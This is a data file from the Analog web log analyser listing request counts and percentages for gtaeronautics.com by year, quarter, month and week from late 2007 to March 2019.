x	VE	analog 5.24
x	HN	gtaeronautics.com
x	PS	2019	03	24	06	29
x	FR	2007	12	18	17	05
x	LR	2019	03	22	23	49
x	E7	2019	03	24	06	29
x	SR	761534
x	S7	1438
x	NC	318114
x	C7	0
x	FL	336527
x	F7	540
x	RR	179
x	R7	0
x	NH	69589
x	H7	347
x	BT	25024923595
x	B7	72095739
1	Rr	19255	2.528	2019
1	Rr	68927	9.051	2018
1	Rr	60168	7.901	2017
1	Rr	73316	9.627	2016
1	Rr	80796	10.610	2015
1	Rr	110773	14.546	2014
1	Rr	65173	8.558	2013
1	Rr	60742	7.976	2012
1	Rr	57015	7.487	2011
1	Rr	22139	2.907	2010
1	Rr	69710	9.154	2009
1	Rr	71820	9.431	2008
1	Rr	1700	0.223	2007
1	*BT	R	110773	2014
Q	Rr	19255	2.528	2019	1
Q	Rr	18129	2.381	2018	4
Q	Rr	17138	2.250	2018	3
Q	Rr	16928	2.223	2018	2
Q	Rr	16732	2.197	2018	1
Q	Rr	15937	2.093	2017	4
Q	Rr	0	0.000	2017	3
Q	Rr	16831	2.210	2017	2
Q	Rr	27400	3.598	2017	1
Q	Rr	22114	2.904	2016	4
Q	Rr	17621	2.314	2016	3
Q	Rr	15878	2.085	2016	2
Q	Rr	17703	2.325	2016	1
Q	Rr	16575	2.177	2015	4
Q	Rr	22104	2.903	2015	3
Q	Rr	22485	2.953	2015	2
Q	Rr	19632	2.578	2015	1
Q	Rr	21142	2.776	2014	4
Q	Rr	22272	2.925	2014	3
Q	Rr	31453	4.130	2014	2
Q	Rr	35906	4.715	2014	1
Q	Rr	16436	2.158	2013	4
Q	Rr	15216	1.998	2013	3
Q	Rr	16545	2.173	2013	2
Q	Rr	16976	2.229	2013	1
Q	Rr	16578	2.177	2012	4
Q	Rr	12511	1.643	2012	3
Q	Rr	15816	2.077	2012	2
Q	Rr	15837	2.080	2012	1
Q	Rr	15444	2.028	2011	4
Q	Rr	17386	2.283	2011	3
Q	Rr	9395	1.234	2011	2
Q	Rr	14790	1.942	2011	1
Q	Rr	1603	0.210	2010	4
Q	Rr	0	0.000	2010	3
Q	Rr	14047	1.845	2010	2
Q	Rr	6489	0.852	2010	1
Q	Rr	16350	2.147	2009	4
Q	Rr	18220	2.393	2009	3
Q	Rr	17115	2.247	2009	2
Q	Rr	18025	2.367	2009	1
Q	Rr	15905	2.089	2008	4
Q	Rr	15660	2.056	2008	3
Q	Rr	22448	2.948	2008	2
Q	Rr	17807	2.338	2008	1
Q	Rr	1700	0.223	2007	4
Q	*BT	R	35906	2014	1
m	Rr	4819	0.633	2019	03
m	Rr	6374	0.837	2019	02
m	Rr	8062	1.059	2019	01
m	Rr	6957	0.914	2018	12
m	Rr	5422	0.712	2018	11
m	Rr	5750	0.755	2018	10
m	Rr	5458	0.717	2018	09
m	Rr	5735	0.753	2018	08
m	Rr	5945	0.781	2018	07
m	Rr	7110	0.934	2018	06
m	Rr	6440	0.846	2018	05
m	Rr	3378	0.444	2018	04
m	Rr	5789	0.760	2018	03
m	Rr	5369	0.705	2018	02
m	Rr	5574	0.732	2018	01
m	Rr	3906	0.513	2017	12
m	Rr	6533	0.858	2017	11
m	Rr	5498	0.722	2017	10
m	Rr	0	0.000	2017	09
m	Rr	0	0.000	2017	08
m	Rr	0	0.000	2017	07
m	Rr	0	0.000	2017	06
m	Rr	6832	0.897	2017	05
m	Rr	9999	1.313	2017	04
m	Rr	11887	1.561	2017	03
m	Rr	7941	1.043	2017	02
m	Rr	7572	0.994	2017	01
m	Rr	9483	1.245	2016	12
m	Rr	7121	0.935	2016	11
m	Rr	5510	0.724	2016	10
m	Rr	6288	0.826	2016	09
m	Rr	5888	0.773	2016	08
m	Rr	5445	0.715	2016	07
m	Rr	5042	0.662	2016	06
m	Rr	5495	0.722	2016	05
m	Rr	5341	0.701	2016	04
m	Rr	5558	0.730	2016	03
m	Rr	5548	0.729	2016	02
m	Rr	6597	0.866	2016	01
m	Rr	5574	0.732	2015	12
m	Rr	5330	0.700	2015	11
m	Rr	5671	0.745	2015	10
m	Rr	6196	0.814	2015	09
m	Rr	6788	0.891	2015	08
m	Rr	9120	1.198	2015	07
m	Rr	7156	0.940	2015	06
m	Rr	5694	0.748	2015	05
m	Rr	9635	1.265	2015	04
m	Rr	6215	0.816	2015	03
m	Rr	6084	0.799	2015	02
m	Rr	7333	0.963	2015	01
m	Rr	6608	0.868	2014	12
m	Rr	6997	0.919	2014	11
m	Rr	7537	0.990	2014	10
m	Rr	7043	0.925	2014	09
m	Rr	7324	0.962	2014	08
m	Rr	7905	1.038	2014	07
m	Rr	11654	1.530	2014	06
m	Rr	9211	1.210	2014	05
m	Rr	10588	1.390	2014	04
m	Rr	7817	1.026	2014	03
m	Rr	15229	2.000	2014	02
m	Rr	12860	1.689	2014	01
m	Rr	5325	0.699	2013	12
m	Rr	5513	0.724	2013	11
m	Rr	5598	0.735	2013	10
m	Rr	4655	0.611	2013	09
m	Rr	4938	0.648	2013	08
m	Rr	5623	0.738	2013	07
m	Rr	5492	0.721	2013	06
m	Rr	5211	0.684	2013	05
m	Rr	5842	0.767	2013	04
m	Rr	6068	0.797	2013	03
m	Rr	5055	0.664	2013	02
m	Rr	5853	0.769	2013	01
m	Rr	5688	0.747	2012	12
m	Rr	5477	0.719	2012	11
m	Rr	5413	0.711	2012	10
m	Rr	4331	0.569	2012	09
m	Rr	3866	0.508	2012	08
m	Rr	4314	0.566	2012	07
m	Rr	4655	0.611	2012	06
m	Rr	6047	0.794	2012	05
m	Rr	5114	0.672	2012	04
m	Rr	6128	0.805	2012	03
m	Rr	5430	0.713	2012	02
m	Rr	4279	0.562	2012	01
m	Rr	5548	0.729	2011	12
m	Rr	4779	0.628	2011	11
m	Rr	5117	0.672	2011	10
m	Rr	5431	0.713	2011	09
m	Rr	6256	0.821	2011	08
m	Rr	5699	0.748	2011	07
m	Rr	5420	0.712	2011	06
m	Rr	3975	0.522	2011	05
m	Rr	0	0.000	2011	04
m	Rr	3608	0.474	2011	03
m	Rr	5171	0.679	2011	02
m	Rr	6011	0.789	2011	01
m	Rr	1603	0.210	2010	12
m	Rr	0	0.000	2010	11
m	Rr	0	0.000	2010	10
m	Rr	0	0.000	2010	09
m	Rr	0	0.000	2010	08
m	Rr	0	0.000	2010	07
m	Rr	4101	0.539	2010	06
m	Rr	5018	0.659	2010	05
m	Rr	4928	0.647	2010	04
m	Rr	5095	0.669	2010	03
m	Rr	1394	0.183	2010	02
m	Rr	0	0.000	2010	01
m	Rr	4665	0.613	2009	12
m	Rr	6187	0.812	2009	11
m	Rr	5498	0.722	2009	10
m	Rr	5066	0.665	2009	09
m	Rr	5718	0.751	2009	08
m	Rr	7436	0.976	2009	07
m	Rr	5685	0.747	2009	06
m	Rr	6120	0.804	2009	05
m	Rr	5310	0.697	2009	04
m	Rr	5515	0.724	2009	03
m	Rr	6123	0.804	2009	02
m	Rr	6387	0.839	2009	01
m	Rr	5763	0.757	2008	12
m	Rr	5420	0.712	2008	11
m	Rr	4722	0.620	2008	10
m	Rr	5435	0.714	2008	09
m	Rr	4843	0.636	2008	08
m	Rr	5382	0.707	2008	07
m	Rr	6082	0.799	2008	06
m	Rr	9946	1.306	2008	05
m	Rr	6420	0.843	2008	04
m	Rr	5431	0.713	2008	03
m	Rr	6469	0.849	2008	02
m	Rr	5907	0.776	2008	01
m	Rr	1700	0.223	2007	12
m	*BT	R	15229	2014	02
W	Rr	1464	0.192	2019	03	17
W	Rr	1381	0.181	2019	03	10
W	Rr	1627	0.214	2019	03	03
W	Rr	1773	0.233	2019	02	24
W	Rr	1669	0.219	2019	02	17
W	Rr	1483	0.195	2019	02	10
W	Rr	1391	0.183	2019	02	03
W	Rr	1797	0.236	2019	01	27
W	Rr	1963	0.258	2019	01	20
W	Rr	2029	0.266	2019	01	13
W	Rr	1696	0.223	2019	01	06
W	Rr	1526	0.200	2018	12	30
W	Rr	1226	0.161	2018	12	23
W	Rr	1442	0.189	2018	12	16
W	Rr	1936	0.254	2018	12	09
W	Rr	1809	0.238	2018	12	02
W	Rr	1295	0.170	2018	11	25
W	Rr	1820	0.239	2018	11	18
W	Rr	1802	0.237	2018	11	11
W	Rr	0	0.000	2018	11	04
W	Rr	1473	0.193	2018	10	28
W	Rr	1106	0.145	2018	10	21
W	Rr	1427	0.187	2018	10	14
W	Rr	1214	0.159	2018	10	07
W	Rr	1168	0.153	2018	09	30
W	Rr	1420	0.186	2018	09	23
W	Rr	1197	0.157	2018	09	16
W	Rr	1388	0.182	2018	09	09
W	Rr	1320	0.173	2018	09	02
W	Rr	1246	0.164	2018	08	26
W	Rr	1214	0.159	2018	08	19
W	Rr	1366	0.179	2018	08	12
W	Rr	1195	0.157	2018	08	05
W	Rr	1346	0.177	2018	07	29
W	Rr	1374	0.180	2018	07	22
W	Rr	1508	0.198	2018	07	15
W	Rr	1522	0.200	2018	07	08
W	Rr	909	0.119	2018	07	01
W	Rr	1444	0.190	2018	06	24
W	Rr	2682	0.352	2018	06	17
W	Rr	1365	0.179	2018	06	10
W	Rr	1329	0.175	2018	06	03
W	Rr	1275	0.167	2018	05	27
W	Rr	1392	0.183	2018	05	20
W	Rr	1321	0.173	2018	05	13
W	Rr	1527	0.201	2018	05	06
W	Rr	1517	0.199	2018	04	29
W	Rr	0	0.000	2018	04	22
W	Rr	1364	0.179	2018	04	15
W	Rr	1712	0.225	2018	04	08
W	Rr	0	0.000	2018	04	01
W	Rr	1543	0.203	2018	03	25
W	Rr	1342	0.176	2018	03	18
W	Rr	2429	0.319	2018	03	11
W	Rr	0	0.000	2018	03	04
W	Rr	1366	0.179	2018	02	25
W	Rr	1308	0.172	2018	02	18
W	Rr	1439	0.189	2018	02	11
W	Rr	1731	0.227	2018	02	04
W	Rr	0	0.000	2018	01	28
W	Rr	1434	0.188	2018	01	21
W	Rr	1578	0.207	2018	01	14
W	Rr	1471	0.193	2018	01	07
W	Rr	1246	0.164	2017	12	31
W	Rr	1033	0.136	2017	12	24
W	Rr	1103	0.145	2017	12	17
W	Rr	1406	0.185	2017	12	10
W	Rr	0	0.000	2017	12	03
W	Rr	1335	0.175	2017	11	26
W	Rr	1427	0.187	2017	11	19
W	Rr	1662	0.218	2017	11	12
W	Rr	1414	0.186	2017	11	05
W	Rr	1349	0.177	2017	10	29
W	Rr	1208	0.159	2017	10	22
W	Rr	2013	0.264	2017	10	15
W	Rr	1832	0.241	2017	10	08
W	Rr	0	0.000	2017	10	01
W	Rr	0	0.000	2017	09	24
W	Rr	0	0.000	2017	09	17
W	Rr	0	0.000	2017	09	10
W	Rr	0	0.000	2017	09	03
W	Rr	0	0.000	2017	08	27
W	Rr	0	0.000	2017	08	20
W	Rr	0	0.000	2017	08	13
W	Rr	0	0.000	2017	08	06
W	Rr	0	0.000	2017	07	30
W	Rr	0	0.000	2017	07	23
W	Rr	0	0.000	2017	07	16
W	Rr	0	0.000	2017	07	09
W	Rr	0	0.000	2017	07	02
W	Rr	0	0.000	2017	06	25
W	Rr	0	0.000	2017	06	18
W	Rr	0	0.000	2017	06	11
W	Rr	0	0.000	2017	06	04
W	Rr	25	0.003	2017	05	28
W	Rr	1838	0.241	2017	05	21
W	Rr	1915	0.251	2017	05	14
W	Rr	1676	0.220	2017	05	07
W	Rr	1677	0.220	2017	04	30
W	Rr	2071	0.272	2017	04	23
W	Rr	1978	0.260	2017	04	16
W	Rr	1874	0.246	2017	04	09
W	Rr	3435	0.451	2017	04	02
W	Rr	2619	0.344	2017	03	26
W	Rr	2633	0.346	2017	03	19
W	Rr	2413	0.317	2017	03	12
W	Rr	3092	0.406	2017	03	05
W	Rr	2295	0.301	2017	02	26
W	Rr	2204	0.289	2017	02	19
W	Rr	1869	0.245	2017	02	12
W	Rr	1973	0.259	2017	02	05
W	Rr	1783	0.234	2017	01	29
W	Rr	1768	0.232	2017	01	22
W	Rr	1585	0.208	2017	01	15
W	Rr	1768	0.232	2017	01	08
W	Rr	1740	0.228	2017	01	01
W	Rr	1549	0.203	2016	12	25
W	Rr	2202	0.289	2016	12	18
W	Rr	1812	0.238	2016	12	11
W	Rr	2648	0.348	2016	12	04
W	Rr	2236	0.294	2016	11	27
W	Rr	1321	0.173	2016	11	20
W	Rr	1996	0.262	2016	11	13
W	Rr	1716	0.225	2016	11	06
W	Rr	1564	0.205	2016	10	30
W	Rr	1362	0.179	2016	10	23
W	Rr	1707	0.224	2016	10	16
W	Rr	1696	0.223	2016	10	09
W	Rr	36	0.005	2016	10	02
W	Rr	2002	0.263	2016	09	25
W	Rr	1399	0.184	2016	09	18
W	Rr	1199	0.157	2016	09	11
W	Rr	1326	0.174	2016	09	04
W	Rr	1316	0.173	2016	08	28
W	Rr	1257	0.165	2016	08	21
W	Rr	1208	0.159	2016	08	14
W	Rr	1602	0.210	2016	08	07
W	Rr	1319	0.173	2016	07	31
W	Rr	1796	0.236	2016	07	24
W	Rr	1171	0.154	2016	07	17
W	Rr	1167	0.153	2016	07	10
W	Rr	917	0.120	2016	07	03
W	Rr	920	0.121	2016	06	26
W	Rr	1179	0.155	2016	06	19
W	Rr	1288	0.169	2016	06	12
W	Rr	1237	0.162	2016	06	05
W	Rr	1263	0.166	2016	05	29
W	Rr	1338	0.176	2016	05	22
W	Rr	1184	0.155	2016	05	15
W	Rr	1365	0.179	2016	05	08
W	Rr	974	0.128	2016	05	01
W	Rr	1311	0.172	2016	04	24
W	Rr	1127	0.148	2016	04	17
W	Rr	1248	0.164	2016	04	10
W	Rr	1451	0.191	2016	04	03
W	Rr	987	0.130	2016	03	27
W	Rr	1233	0.162	2016	03	20
W	Rr	1347	0.177	2016	03	13
W	Rr	1347	0.177	2016	03	06
W	Rr	1236	0.162	2016	02	28
W	Rr	1422	0.187	2016	02	21
W	Rr	1085	0.142	2016	02	14
W	Rr	1427	0.187	2016	02	07
W	Rr	1359	0.178	2016	01	31
W	Rr	1708	0.224	2016	01	24
W	Rr	1476	0.194	2016	01	17
W	Rr	1563	0.205	2016	01	10
W	Rr	1381	0.181	2016	01	03
W	Rr	1273	0.167	2015	12	27
W	Rr	1084	0.142	2015	12	20
W	Rr	1344	0.176	2015	12	13
W	Rr	1336	0.175	2015	12	06
W	Rr	1123	0.147	2015	11	29
W	Rr	960	0.126	2015	11	22
W	Rr	1337	0.176	2015	11	15
W	Rr	1400	0.184	2015	11	08
W	Rr	1383	0.182	2015	11	01
W	Rr	1250	0.164	2015	10	25
W	Rr	1366	0.179	2015	10	18
W	Rr	1367	0.180	2015	10	11
W	Rr	1214	0.159	2015	10	04
W	Rr	1152	0.151	2015	09	27
W	Rr	1387	0.182	2015	09	20
W	Rr	1655	0.217	2015	09	13
W	Rr	1526	0.200	2015	09	06
W	Rr	1242	0.163	2015	08	30
W	Rr	1800	0.236	2015	08	23
W	Rr	1527	0.201	2015	08	16
W	Rr	1386	0.182	2015	08	09
W	Rr	1593	0.209	2015	08	02
W	Rr	1567	0.206	2015	07	26
W	Rr	1980	0.260	2015	07	19
W	Rr	2180	0.286	2015	07	12
W	Rr	2008	0.264	2015	07	05
W	Rr	2297	0.302	2015	06	28
W	Rr	1556	0.204	2015	06	21
W	Rr	1380	0.181	2015	06	14
W	Rr	2013	0.264	2015	06	07
W	Rr	1651	0.217	2015	05	31
W	Rr	1224	0.161	2015	05	24
W	Rr	1355	0.178	2015	05	17
W	Rr	1179	0.155	2015	05	10
W	Rr	1436	0.189	2015	05	03
W	Rr	1671	0.219	2015	04	26
W	Rr	1878	0.247	2015	04	19
W	Rr	2326	0.305	2015	04	12
W	Rr	2636	0.346	2015	04	05
W	Rr	2297	0.302	2015	03	29
W	Rr	1237	0.162	2015	03	22
W	Rr	1453	0.191	2015	03	15
W	Rr	1399	0.184	2015	03	08
W	Rr	1287	0.169	2015	03	01
W	Rr	1249	0.164	2015	02	22
W	Rr	1373	0.180	2015	02	15
W	Rr	1790	0.235	2015	02	08
W	Rr	1672	0.220	2015	02	01
W	Rr	1543	0.203	2015	01	25
W	Rr	1463	0.192	2015	01	18
W	Rr	1696	0.223	2015	01	11
W	Rr	1707	0.224	2015	01	04
W	Rr	1833	0.241	2014	12	28
W	Rr	1335	0.175	2014	12	21
W	Rr	1644	0.216	2014	12	14
W	Rr	1541	0.202	2014	12	07
W	Rr	1335	0.175	2014	11	30
W	Rr	1262	0.166	2014	11	23
W	Rr	2009	0.264	2014	11	16
W	Rr	1566	0.206	2014	11	09
W	Rr	1814	0.238	2014	11	02
W	Rr	1452	0.191	2014	10	26
W	Rr	1642	0.216	2014	10	19
W	Rr	1795	0.236	2014	10	12
W	Rr	1836	0.241	2014	10	05
W	Rr	1662	0.218	2014	09	28
W	Rr	1843	0.242	2014	09	21
W	Rr	1678	0.220	2014	09	14
W	Rr	1598	0.210	2014	09	07
W	Rr	1418	0.186	2014	08	31
W	Rr	1584	0.208	2014	08	24
W	Rr	1571	0.206	2014	08	17
W	Rr	1727	0.227	2014	08	10
W	Rr	1927	0.253	2014	08	03
W	Rr	1691	0.222	2014	07	27
W	Rr	1702	0.223	2014	07	20
W	Rr	1624	0.213	2014	07	13
W	Rr	1831	0.240	2014	07	06
W	Rr	1867	0.245	2014	06	29
W	Rr	1927	0.253	2014	06	22
W	Rr	2134	0.280	2014	06	15
W	Rr	4851	0.637	2014	06	08
W	Rr	2293	0.301	2014	06	01
W	Rr	3180	0.418	2014	05	25
W	Rr	1468	0.193	2014	05	18
W	Rr	1808	0.237	2014	05	11
W	Rr	1998	0.262	2014	05	04
W	Rr	1876	0.246	2014	04	27
W	Rr	2330	0.306	2014	04	20
W	Rr	2565	0.337	2014	04	13
W	Rr	2652	0.348	2014	04	06
W	Rr	2574	0.338	2014	03	30
W	Rr	1186	0.156	2014	03	23
W	Rr	1305	0.171	2014	03	16
W	Rr	2273	0.298	2014	03	09
W	Rr	2231	0.293	2014	03	02
W	Rr	1925	0.253	2014	02	23
W	Rr	7060	0.927	2014	02	16
W	Rr	2854	0.375	2014	02	09
W	Rr	3190	0.419	2014	02	02
W	Rr	3743	0.492	2014	01	26
W	Rr	3643	0.478	2014	01	19
W	Rr	2961	0.389	2014	01	12
W	Rr	2319	0.305	2014	01	05
W	Rr	981	0.129	2013	12	29
W	Rr	1108	0.145	2013	12	22
W	Rr	1226	0.161	2013	12	15
W	Rr	1285	0.169	2013	12	08
W	Rr	1289	0.169	2013	12	01
W	Rr	1404	0.184	2013	11	24
W	Rr	1142	0.150	2013	11	17
W	Rr	1334	0.175	2013	11	10
W	Rr	1277	0.168	2013	11	03
W	Rr	1035	0.136	2013	10	27
W	Rr	1309	0.172	2013	10	20
W	Rr	1302	0.171	2013	10	13
W	Rr	1432	0.188	2013	10	06
W	Rr	1178	0.155	2013	09	29
W	Rr	947	0.124	2013	09	22
W	Rr	1254	0.165	2013	09	15
W	Rr	1099	0.144	2013	09	08
W	Rr	1053	0.138	2013	09	01
W	Rr	1010	0.133	2013	08	25
W	Rr	1102	0.145	2013	08	18
W	Rr	1063	0.140	2013	08	11
W	Rr	1105	0.145	2013	08	04
W	Rr	1377	0.181	2013	07	28
W	Rr	1498	0.197	2013	07	21
W	Rr	1295	0.170	2013	07	14
W	Rr	1237	0.162	2013	07	07
W	Rr	1003	0.132	2013	06	30
W	Rr	1275	0.167	2013	06	23
W	Rr	1072	0.141	2013	06	16
W	Rr	1249	0.164	2013	06	09
W	Rr	1521	0.200	2013	06	02
W	Rr	1256	0.165	2013	05	26
W	Rr	1091	0.143	2013	05	19
W	Rr	1359	0.178	2013	05	12
W	Rr	1130	0.148	2013	05	05
W	Rr	1215	0.160	2013	04	28
W	Rr	1368	0.180	2013	04	21
W	Rr	1318	0.173	2013	04	14
W	Rr	1408	0.185	2013	04	07
W	Rr	1277	0.168	2013	03	31
W	Rr	1452	0.191	2013	03	24
W	Rr	1418	0.186	2013	03	17
W	Rr	1217	0.160	2013	03	10
W	Rr	1490	0.196	2013	03	03
W	Rr	1353	0.178	2013	02	24
W	Rr	1268	0.167	2013	02	17
W	Rr	1274	0.167	2013	02	10
W	Rr	1153	0.151	2013	02	03
W	Rr	1266	0.166	2013	01	27
W	Rr	1271	0.167	2013	01	20
W	Rr	1449	0.190	2013	01	13
W	Rr	1253	0.165	2013	01	06
W	Rr	1309	0.172	2012	12	30
W	Rr	1156	0.152	2012	12	23
W	Rr	1336	0.175	2012	12	16
W	Rr	1575	0.207	2012	12	09
W	Rr	1087	0.143	2012	12	02
W	Rr	1376	0.181	2012	11	25
W	Rr	1136	0.149	2012	11	18
W	Rr	1341	0.176	2012	11	11
W	Rr	1418	0.186	2012	11	04
W	Rr	1103	0.145	2012	10	28
W	Rr	1200	0.158	2012	10	21
W	Rr	1382	0.181	2012	10	14
W	Rr	1127	0.148	2012	10	07
W	Rr	1187	0.156	2012	09	30
W	Rr	1172	0.154	2012	09	23
W	Rr	1034	0.136	2012	09	16
W	Rr	944	0.124	2012	09	09
W	Rr	958	0.126	2012	09	02
W	Rr	734	0.096	2012	08	26
W	Rr	881	0.116	2012	08	19
W	Rr	874	0.115	2012	08	12
W	Rr	973	0.128	2012	08	05
W	Rr	1010	0.133	2012	07	29
W	Rr	943	0.124	2012	07	22
W	Rr	1089	0.143	2012	07	15
W	Rr	888	0.117	2012	07	08
W	Rr	845	0.111	2012	07	01
W	Rr	1070	0.141	2012	06	24
W	Rr	1050	0.138	2012	06	17
W	Rr	1271	0.167	2012	06	10
W	Rr	957	0.126	2012	06	03
W	Rr	1249	0.164	2012	05	27
W	Rr	1055	0.139	2012	05	20
W	Rr	1392	0.183	2012	05	13
W	Rr	1140	0.150	2012	05	06
W	Rr	1807	0.237	2012	04	29
W	Rr	1225	0.161	2012	04	22
W	Rr	1264	0.166	2012	04	15
W	Rr	1075	0.141	2012	04	08
W	Rr	1261	0.166	2012	04	01
W	Rr	1345	0.177	2012	03	25
W	Rr	1254	0.165	2012	03	18
W	Rr	1478	0.194	2012	03	11
W	Rr	1503	0.197	2012	03	04
W	Rr	1532	0.201	2012	02	26
W	Rr	1464	0.192	2012	02	19
W	Rr	1154	0.152	2012	02	12
W	Rr	1240	0.163	2012	02	05
W	Rr	1088	0.143	2012	01	29
W	Rr	1125	0.148	2012	01	22
W	Rr	60	0.008	2012	01	15
W	Rr	1472	0.193	2012	01	08
W	Rr	1122	0.147	2012	01	01
W	Rr	888	0.117	2011	12	25
W	Rr	1360	0.179	2011	12	18
W	Rr	1486	0.195	2011	12	11
W	Rr	1330	0.175	2011	12	04
W	Rr	1094	0.144	2011	11	27
W	Rr	1062	0.139	2011	11	20
W	Rr	1123	0.147	2011	11	13
W	Rr	975	0.128	2011	11	06
W	Rr	1264	0.166	2011	10	30
W	Rr	1140	0.150	2011	10	23
W	Rr	1211	0.159	2011	10	16
W	Rr	1236	0.162	2011	10	09
W	Rr	1128	0.148	2011	10	02
W	Rr	1083	0.142	2011	09	25
W	Rr	1451	0.191	2011	09	18
W	Rr	1278	0.168	2011	09	11
W	Rr	1219	0.160	2011	09	04
W	Rr	1316	0.173	2011	08	28
W	Rr	1119	0.147	2011	08	21
W	Rr	1484	0.195	2011	08	14
W	Rr	1671	0.219	2011	08	07
W	Rr	1319	0.173	2011	07	31
W	Rr	1197	0.157	2011	07	24
W	Rr	1504	0.197	2011	07	17
W	Rr	1367	0.180	2011	07	10
W	Rr	1205	0.158	2011	07	03
W	Rr	1333	0.175	2011	06	26
W	Rr	1059	0.139	2011	06	19
W	Rr	1353	0.178	2011	06	12
W	Rr	1275	0.167	2011	06	05
W	Rr	983	0.129	2011	05	29
W	Rr	1262	0.166	2011	05	22
W	Rr	1374	0.180	2011	05	15
W	Rr	1076	0.141	2011	05	08
W	Rr	0	0.000	2011	05	01
W	Rr	0	0.000	2011	04	24
W	Rr	0	0.000	2011	04	17
W	Rr	0	0.000	2011	04	10
W	Rr	0	0.000	2011	04	03
W	Rr	0	0.000	2011	03	27
W	Rr	24	0.003	2011	03	20
W	Rr	1317	0.173	2011	03	13
W	Rr	1258	0.165	2011	03	06
W	Rr	1372	0.180	2011	02	27
W	Rr	1226	0.161	2011	02	20
W	Rr	1524	0.200	2011	02	13
W	Rr	1366	0.179	2011	02	06
W	Rr	958	0.126	2011	01	30
W	Rr	1273	0.167	2011	01	23
W	Rr	1560	0.205	2011	01	16
W	Rr	1472	0.193	2011	01	09
W	Rr	1310	0.172	2011	01	02
W	Rr	798	0.105	2010	12	26
W	Rr	935	0.123	2010	12	19
W	Rr	0	0.000	2010	12	12
W	Rr	0	0.000	2010	12	05
W	Rr	0	0.000	2010	11	28
W	Rr	0	0.000	2010	11	21
W	Rr	0	0.000	2010	11	14
W	Rr	0	0.000	2010	11	07
W	Rr	0	0.000	2010	10	31
W	Rr	0	0.000	2010	10	24
W	Rr	0	0.000	2010	10	17
W	Rr	0	0.000	2010	10	10
W	Rr	0	0.000	2010	10	03
W	Rr	0	0.000	2010	09	26
W	Rr	0	0.000	2010	09	19
W	Rr	0	0.000	2010	09	12
W	Rr	0	0.000	2010	09	05
W	Rr	0	0.000	2010	08	29
W	Rr	0	0.000	2010	08	22
W	Rr	0	0.000	2010	08	15
W	Rr	0	0.000	2010	08	08
W	Rr	0	0.000	2010	08	01
W	Rr	0	0.000	2010	07	25
W	Rr	0	0.000	2010	07	18
W	Rr	0	0.000	2010	07	11
W	Rr	0	0.000	2010	07	04
W	Rr	15	0.002	2010	06	27
W	Rr	914	0.120	2010	06	20
W	Rr	1104	0.145	2010	06	13
W	Rr	1096	0.144	2010	06	06
W	Rr	1171	0.154	2010	05	30
W	Rr	1115	0.146	2010	05	23
W	Rr	1170	0.154	2010	05	16
W	Rr	1334	0.175	2010	05	09
W	Rr	1109	0.146	2010	05	02
W	Rr	1067	0.140	2010	04	25
W	Rr	1212	0.159	2010	04	18
W	Rr	1054	0.138	2010	04	11
W	Rr	1325	0.174	2010	04	04
W	Rr	811	0.106	2010	03	28
W	Rr	1195	0.157	2010	03	21
W	Rr	1338	0.176	2010	03	14
W	Rr	1113	0.146	2010	03	07
W	Rr	1103	0.145	2010	02	28
W	Rr	1290	0.169	2010	02	21
W	Rr	0	0.000	2010	02	14
W	Rr	0	0.000	2010	02	07
W	Rr	0	0.000	2010	01	31
W	Rr	0	0.000	2010	01	24
W	Rr	0	0.000	2010	01	17
W	Rr	0	0.000	2010	01	10
W	Rr	0	0.000	2010	01	03
W	Rr	78	0.010	2009	12	27
W	Rr	945	0.124	2009	12	20
W	Rr	1140	0.150	2009	12	13
W	Rr	1323	0.174	2009	12	06
W	Rr	1518	0.199	2009	11	29
W	Rr	1352	0.178	2009	11	22
W	Rr	1346	0.177	2009	11	15
W	Rr	1416	0.186	2009	11	08
W	Rr	1734	0.228	2009	11	01
W	Rr	1035	0.136	2009	10	25
W	Rr	1297	0.170	2009	10	18
W	Rr	1267	0.166	2009	10	11
W	Rr	1440	0.189	2009	10	04
W	Rr	1521	0.200	2009	09	27
W	Rr	1121	0.147	2009	09	20
W	Rr	875	0.115	2009	09	13
W	Rr	1032	0.136	2009	09	06
W	Rr	1283	0.168	2009	08	30
W	Rr	1214	0.159	2009	08	23
W	Rr	1402	0.184	2009	08	16
W	Rr	1260	0.165	2009	08	09
W	Rr	1404	0.184	2009	08	02
W	Rr	1380	0.181	2009	07	26
W	Rr	1470	0.193	2009	07	19
W	Rr	1750	0.230	2009	07	12
W	Rr	1847	0.243	2009	07	05
W	Rr	1889	0.248	2009	06	28
W	Rr	1312	0.172	2009	06	21
W	Rr	1093	0.144	2009	06	14
W	Rr	1363	0.179	2009	06	07
W	Rr	1251	0.164	2009	05	31
W	Rr	1352	0.178	2009	05	24
W	Rr	1133	0.149	2009	05	17
W	Rr	1887	0.248	2009	05	10
W	Rr	1369	0.180	2009	05	03
W	Rr	1089	0.143	2009	04	26
W	Rr	1160	0.152	2009	04	19
W	Rr	1189	0.156	2009	04	12
W	Rr	1529	0.201	2009	04	05
W	Rr	1155	0.152	2009	03	29
W	Rr	1230	0.162	2009	03	22
W	Rr	1029	0.135	2009	03	15
W	Rr	1234	0.162	2009	03	08
W	Rr	1486	0.195	2009	03	01
W	Rr	1470	0.193	2009	02	22
W	Rr	1198	0.157	2009	02	15
W	Rr	1802	0.237	2009	02	08
W	Rr	1653	0.217	2009	02	01
W	Rr	1346	0.177	2009	01	25
W	Rr	1431	0.188	2009	01	18
W	Rr	1678	0.220	2009	01	11
W	Rr	1591	0.209	2009	01	04
W	Rr	886	0.116	2008	12	28
W	Rr	1148	0.151	2008	12	21
W	Rr	1428	0.188	2008	12	14
W	Rr	1508	0.198	2008	12	07
W	Rr	1194	0.157	2008	11	30
W	Rr	1070	0.141	2008	11	23
W	Rr	1396	0.183	2008	11	16
W	Rr	1255	0.165	2008	11	09
W	Rr	1314	0.173	2008	11	02
W	Rr	1397	0.183	2008	10	26
W	Rr	1638	0.215	2008	10	19
W	Rr	1298	0.170	2008	10	12
W	Rr	430	0.056	2008	10	05
W	Rr	723	0.095	2008	09	28
W	Rr	1308	0.172	2008	09	21
W	Rr	1242	0.163	2008	09	14
W	Rr	1409	0.185	2008	09	07
W	Rr	1142	0.150	2008	08	31
W	Rr	1022	0.134	2008	08	24
W	Rr	1062	0.139	2008	08	17
W	Rr	1188	0.156	2008	08	10
W	Rr	1232	0.162	2008	08	03
W	Rr	1050	0.138	2008	07	27
W	Rr	1272	0.167	2008	07	20
W	Rr	1305	0.171	2008	07	13
W	Rr	1093	0.144	2008	07	06
W	Rr	1182	0.155	2008	06	29
W	Rr	1937	0.254	2008	06	22
W	Rr	1493	0.196	2008	06	15
W	Rr	1083	0.142	2008	06	08
W	Rr	1283	0.168	2008	06	01
W	Rr	1432	0.188	2008	05	25
W	Rr	1726	0.227	2008	05	18
W	Rr	1580	0.207	2008	05	11
